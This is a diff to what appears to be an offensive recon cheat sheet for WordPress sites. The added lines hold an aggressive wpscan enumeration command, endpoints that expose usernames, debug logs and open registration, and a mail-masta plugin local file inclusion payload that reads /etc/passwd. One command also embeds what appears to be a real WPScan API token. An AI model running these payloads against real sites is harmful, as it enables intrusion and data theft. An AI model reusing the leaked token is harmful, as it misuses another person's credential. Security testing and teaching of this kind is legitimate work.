@@ -35,6 +35,16 @@ cat clean_urls.txt | grep -E "wp-content|wp-admin|wp-includes|xmlrpc.php|wp-logi
 ### **Scan WordPress Installations for Vulnerabilities**
 ```bash
 wpscan --url https://target.com --disable-tls-checks --api-token API_KEY -e ap --plugins-detection aggressive
+wpscan --url https://target.com --disable-tls-checks --api-token zBsi404GGCMKGzTraiEsSsQsFXCsUVWmaDUsn3EPuKc -e at -e ap -e u --enumerate ap --plugins-detection aggressive --force
+wordpress usernames exposure :
+/wp-json/wp/v2/users
+/author-sitemap.xml
+/wp-content/debug.log
+/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd
+	
+/wp-login.php?action=register
+/wp-json/?rest_route=/wp/v2/users/
+/wp-json/?rest_route=/wp/v2/users/n
 ```
 ✅ **Checks for exposed WordPress users, plugins, and security misconfigurations.**
 
